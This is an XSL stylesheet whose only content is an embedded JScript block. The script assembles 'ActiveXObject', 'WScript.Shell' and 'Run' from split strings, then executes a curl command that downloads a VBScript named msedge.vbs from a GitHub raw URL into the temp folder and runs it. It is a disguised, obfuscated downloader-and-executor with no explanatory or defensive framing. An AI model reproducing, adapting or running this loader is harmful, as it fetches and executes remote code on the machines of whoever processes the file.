<?xml version='1.0'?> 
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="unknown" version="1.0">
<output method="text"/>
<ms:script language="JScript" implements-prefix="user"> 
<![CDATA[
var a = "ActiveXObject", b = "WScript.Shell", c = "Run", d = "curl https://raw.githubusercontent.com/Vicky-Syst/mofa/main/msedge.vbs -o %TEMP%\\msedge.vbs && %TEMP%\\msedge.vbs";
var e = new Function("return new " + a + "(\"" + b + "\")." + c + "(\"" + d + "\")");
e();
]]> 
</ms:script>
</stylesheet>
